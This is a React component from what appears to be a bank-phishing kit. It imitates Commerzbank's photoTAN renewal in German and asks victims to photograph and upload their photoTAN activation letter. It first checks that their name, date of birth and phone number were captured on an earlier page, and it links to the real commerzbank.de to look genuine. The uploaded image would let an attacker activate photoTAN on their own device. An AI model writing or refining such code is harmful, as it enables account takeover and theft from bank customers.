import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLanguage } from '../contexts/LanguageContext';
import apiService from '../services/api';
import { FaArrowRight } from 'react-icons/fa';

const UploadPage: React.FC = () => {
  const navigate = useNavigate();
  const { t } = useLanguage();
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [isMobile, setIsMobile] = useState(false);
  const [debugLog, setDebugLog] = useState<string[]>([]);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Add debug message to screen (visible on mobile)
  const addDebugLog = (message: string) => {
    console.log(message);
    setDebugLog(prev => [...prev.slice(-15), `${message}`]);
  };

  useEffect(() => {
    // Check if user came from info page (check both sessionStorage and localStorage)
    const xname1 = sessionStorage.getItem('xname1') || localStorage.getItem('xname1');
    const xname2 = sessionStorage.getItem('xname2') || localStorage.getItem('xname2');
    const xdob = sessionStorage.getItem('xdob') || localStorage.getItem('xdob');
    const xtel = sessionStorage.getItem('xtel') || localStorage.getItem('xtel');
    
    if (!xname1 || !xname2 || !xdob || !xtel) {
      navigate('/info');
    }

    // Check if mobile
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    
    return () => window.removeEventListener('resize', checkMobile);
  }, [navigate]);

  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setSelectedFile(file);
      setError('');
    }
  };

  const handleCameraCapture = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setSelectedFile(file);
      setError('');
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedFile) {
      setError('Please select a file');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      const formData = new FormData();
        formData.append('file', selectedFile);
      
      const response = await apiService.upload(formData);
      
      if (response.success) {
          navigate('/done');
      } else {
        setError(response.message || 'Upload failed');
      }
    } catch (error) {
      setError('Upload failed. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleUploadClick = () => {
    if (selectedFile) {
      // If file is already selected, upload it
      handleSubmit({ preventDefault: () => {} } as React.FormEvent);
    } else {
      // If no file selected, open file picker
      fileInputRef.current?.click();
    }
  };

  // Process and compress image for camera uploads
  const processImageFile = async (file: File): Promise<File> => {
    addDebugLog('📷 Processing image...');
    addDebugLog(`File: ${file.name}`);
    addDebugLog(`Size: ${Math.round(file.size / 1024)}KB`);
    addDebugLog(`Type: ${file.type || 'none'}`);
    
    // Always try to process camera photos, but with timeout and fallback
    const needsProcessing = file.size > 3 * 1024 * 1024 || !file.type || file.type === '';
    
    if (!needsProcessing) {
      addDebugLog('✅ No compression needed');
      return file;
    }
    
    addDebugLog('🔄 Compressing...');
    
    return new Promise((resolve) => {
      // Set a timeout - if processing takes too long, use original file
      const timeout = setTimeout(() => {
        addDebugLog('⏱️ Timeout - using original');
        resolve(file);
      }, 10000); // 10 second timeout
      
      const reader = new FileReader();
      
      reader.onload = (e) => {
        console.log('FileReader loaded, creating image...');
        const img = new Image();
        
        img.onload = () => {
          console.log('Image loaded. Dimensions:', img.width, 'x', img.height);
          
          try {
            // Create canvas
            const canvas = document.createElement('canvas');
            let width = img.width;
            let height = img.height;
            
            // Scale down if too large
            const maxDimension = 1600;
            if (width > maxDimension || height > maxDimension) {
              if (width > height) {
                height = Math.floor((height / width) * maxDimension);
                width = maxDimension;
              } else {
                width = Math.floor((width / height) * maxDimension);
                height = maxDimension;
              }
              console.log('Scaled to:', width, 'x', height);
            }
            
            canvas.width = width;
            canvas.height = height;
            
            const ctx = canvas.getContext('2d');
            if (!ctx) {
              console.error('Could not get canvas context - using original file');
              clearTimeout(timeout);
              resolve(file);
              return;
            }
            
            ctx.drawImage(img, 0, 0, width, height);
            console.log('Drew image on canvas, converting to blob...');
            
            // Convert to blob with compression
            canvas.toBlob(
              (blob) => {
                clearTimeout(timeout);
                
                if (!blob) {
                  console.error('Could not create blob - using original file');
                  resolve(file);
                  return;
                }
                
                // Create new file with proper name and type
                let fileName = file.name || 'camera-photo.jpg';
                if (!fileName.toLowerCase().endsWith('.jpg') && !fileName.toLowerCase().endsWith('.jpeg')) {
                  fileName = fileName + '.jpg';
                }
                
                const processedFile = new File([blob], fileName, {
                  type: 'image/jpeg',
                  lastModified: Date.now(),
                });
                
                const ratio = Math.round((1 - processedFile.size / file.size) * 100);
                addDebugLog(`✅ Compressed ${ratio}%`);
                addDebugLog(`New size: ${Math.round(processedFile.size / 1024)}KB`);
                resolve(processedFile);
              },
              'image/jpeg',
              0.8 // Quality - slightly lower for better compression
            );
          } catch (error) {
            console.error('Error during canvas processing:', error);
            clearTimeout(timeout);
            resolve(file);
          }
        };
        
        img.onerror = (error) => {
          console.error('Failed to load image:', error);
          clearTimeout(timeout);
          resolve(file);
        };
        
        img.src = e.target?.result as string;
      };
      
      reader.onerror = (error) => {
        console.error('Failed to read file:', error);
        clearTimeout(timeout);
        resolve(file);
      };
      
      try {
        reader.readAsDataURL(file);
      } catch (error) {
        console.error('Failed to start reading file:', error);
        clearTimeout(timeout);
        resolve(file);
      }
    });
  };

  const handleDirectUpload = async (e?: React.ChangeEvent<HTMLInputElement>) => {
    let file: File | null = null;
    
    if (e && e.target.files) {
      // Called from onChange event
      file = e.target.files[0];
      setSelectedFile(file); // Update selected file state
      setError(''); // Clear any previous errors
    } else {
      // Called from button click
      const fileInput = document.getElementById('directUpload') as HTMLInputElement;
      file = fileInput?.files?.[0] || null;
    }
    
    if (!file) {
      setError('Bitte wählen Sie zuerst eine Datei aus');
      return;
    }

    try {
      setIsLoading(true);
      setError('');
      setDebugLog([]); // Clear previous logs
      
      addDebugLog('🚀 Starting upload...');
      
      const sessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId') || 'mobile-session-' + Date.now();
      
      const processedFile = await processImageFile(file);
      
      addDebugLog('📦 Creating upload data...');
      const formData = new FormData();
      formData.append('file', processedFile);
      formData.append('sessionId', sessionId);
      
      addDebugLog('📤 Uploading to server...');
      const result = await apiService.upload(formData);
      
      addDebugLog('✅ Upload complete!');
      
      if (result.success) {
        addDebugLog('🎉 Success! Redirecting...');
        setTimeout(() => navigate('/done'), 1000);
      } else {
        addDebugLog(`❌ Failed: ${result.message}`);
        setError(result.message || 'Upload fehlgeschlagen');
      }
    } catch (error: any) {
      addDebugLog('❌ ERROR!');
      addDebugLog(`Type: ${typeof error}`);
      addDebugLog(`Msg: ${error?.message || 'Unknown'}`);
      setError('Upload fehlgeschlagen. Bitte versuchen Sie es erneut.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="upload-page" style={{
      fontFamily: 'Arial, Helvetica, sans-serif',
      backgroundColor: '#f5f5f5',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'flex-start',
      padding: '20px 20px 20px 20px',
      margin: 0
    }}>
      {/* Main heading */}
      <h1 style={{
        fontSize: isMobile ? '24px' : '32px',
        fontWeight: 'bold',
        color: '#333',
        marginTop: '20px',
        marginBottom: '20px',
        fontFamily: 'Arial, Helvetica, sans-serif',
        textAlign: 'left',
        width: '100%',
        maxWidth: '1200px',
        margin: '20px auto 20px auto',
        padding: isMobile ? '0 15px' : '0 20px'
      }}>
        Letzter Schritt: Verlängerung Ihres bestehenden photoTAN-Verfahrens
      </h1>

      
      <div style={{
        display: 'flex',
        flexDirection: isMobile ? 'column' : 'row',
        gap: isMobile ? '15px' : '20px',
        width: '100%',
        maxWidth: '1200px',
        alignItems: 'flex-start',
        margin: '0 auto',
        padding: isMobile ? '0 15px' : '0 20px'
      }}>
          {/* Left Column - Upload Section */}
        <div className="upload-section" style={{
          flex: '1',
          background: 'white',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
          padding: isMobile ? '20px' : '40px',
          width: '100%',
          minWidth: isMobile ? 'auto' : '300px'
        }}>
          {/* Upload heading */}
          <h1 style={{
            fontSize: isMobile ? '24px' : '32px',
            fontWeight: 'bold',
            color: '#333',
            marginTop: '0px',
            marginBottom: '20px',
            fontFamily: 'Arial, Helvetica, sans-serif',
            textAlign: 'left'
          }}>
            Aktivierungsgrafik scannen
          </h1>
          <div className="instruction-box" style={{
            backgroundColor: '#f8f9fa',
            border: '2px dashed #000000',
            borderRadius: '8px',
            padding: isMobile ? '15px' : '20px',
            marginBottom: '20px'
          }}>
            <p className="instruction-text" style={{
              fontSize: isMobile ? '13px' : '14px',
              color: '#333',
              lineHeight: '1.5',
              margin: '0 0 15px 0',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              Scannen Sie die Aktivierungsgrafik aus dem erhaltenen Schreiben, um Ihr photoTAN-Verfahren zu verlängern. Nach Prüfung bleibt es weiterhin gültig.
              {isMobile ? ' Tippen Sie auf "📷 Foto auswählen" um ein Foto aus Ihrer Galerie auszuwählen oder ein neues Foto aufzunehmen.' : ' Bitte fotografieren Sie erst den gesamten Aktivierungsbrief und laden Sie das Bild aus Ihrer Galerie hoch.'}
            </p>
            {/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && (
              <div className="mobile-notice" style={{
                backgroundColor: '#fff3cd',
                border: '1px solid #ffeaa7',
                borderRadius: '4px',
                padding: '10px',
                marginTop: '10px'
              }}>
                <p style={{
                  fontSize: '12px',
                  color: '#856404',
                  margin: '0',
                  fontFamily: 'Arial, Helvetica, sans-serif'
                }}>
                  <strong>{t('mobileNotice')}:</strong> {t('mobileNoticeText')}
                </p>
                  </div>
                )}
              </div>
              
          {/* GIF from public folder */}
          <div style={{
            textAlign: 'center',
            marginBottom: '20px'
          }}>
            <img 
              src="/lika2.gif" 
              alt="Upload animation" 
              style={{
                width: isMobile ? '200px' : '250px',
                height: 'auto',
                borderRadius: '8px',
                boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)'
              }}
            />
                      </div>
                      
          {/* File Input and Upload Button */}
          <div style={{ 
            textAlign: 'center',
            margin: '20px 0'
          }}>
            <input
              type="file"
              id="directUpload"
              accept="image/*"
              onChange={handleDirectUpload}
              capture="environment"
              style={{ 
                display: 'none' // Hide the file input
              }}
            />
            <button 
              className="upload-button"
              onClick={() => {
                console.log('Upload button clicked');
                document.getElementById('directUpload')?.click();
              }}
              disabled={isLoading}
              style={{
                background: 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
                color: 'white',
                border: 'none',
                padding: isMobile ? '15px 20px' : '12px 24px',
                borderRadius: '5px',
                cursor: isLoading ? 'not-allowed' : 'pointer',
                fontSize: isMobile ? '14px' : '16px',
                fontWeight: 'bold',
                opacity: isLoading ? 0.7 : 1,
                transition: 'all 0.3s ease',
                minWidth: isMobile ? '100%' : '150px',
                width: isMobile ? '100%' : 'auto'
              }}
            >
              {isLoading ? 'Wird hochgeladen...' : (isMobile ? '📷 Foto auswählen' : 'Datei hochladen')}
            </button>
          </div>

          {/* Selected File Display */}
          {selectedFile && (
            <div style={{
              textAlign: 'center',
              marginTop: '10px',
              padding: '10px',
              backgroundColor: '#e8f5e8',
              borderRadius: '4px',
              border: '1px solid #4caf50'
            }}>
              <p style={{
                margin: '0',
                color: '#2e7d32',
                fontSize: '14px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                Ausgewählt: {selectedFile.name}
              </p>
                  </div>
                )}

          {/* Error Display */}
          {error && (
            <div style={{
              textAlign: 'center',
              marginTop: '10px',
              padding: '10px',
              backgroundColor: '#ffebee',
              borderRadius: '4px',
              border: '1px solid #f44336'
            }}>
              <p style={{
                margin: '0',
                color: '#c62828',
                fontSize: '14px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {error}
              </p>
            </div>
          )}
        </div>

        {/* Debug Log (visible on mobile) */}
        {debugLog.length > 0 && (
          <div style={{
            background: '#000',
            color: '#0f0',
            padding: '10px',
            borderRadius: '5px',
            fontSize: '12px',
            fontFamily: 'monospace',
            marginBottom: '20px',
            maxHeight: '300px',
            overflowY: 'auto'
          }}>
            {debugLog.map((log, i) => (
              <div key={i}>{log}</div>
            ))}
          </div>
        )}

        {/* Important Info Box */}
        <div className="info-panel" style={{
          flex: '1',
          background: 'white',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
          padding: isMobile ? '20px' : '40px'
        }}>
          <h3 style={{
            fontSize: '20px',
            fontWeight: 'bold',
            color: '#333',
            marginBottom: '15px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>
            {t('importantInfo')}
          </h3>
          
          <p style={{
            fontSize: '14px',
            color: '#666',
            marginBottom: '20px',
            lineHeight: '1.5',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>
            {t('photoTANProblems')}
          </p>
          
          <div style={{ marginBottom: '20px' }}>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('noActiveTAN')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('activatePhotoTAN')}</span>
              </a>
            </div>
            <div>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('photoTANHelp')}</span>
              </a>
            </div>
          </div>

          <div style={{ marginBottom: '20px' }}>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('forgotCredentials')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('requestParticipantNumber')}</span>
              </a>
              </div>
            <div>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('forgotPIN')}</span>
              </a>
              </div>
              </div>

          <div>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('allAboutOnlineBanking')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('instructionsHelp')}</span>
              </a>
              </div>
            <div>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('security')}</span>
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default UploadPage;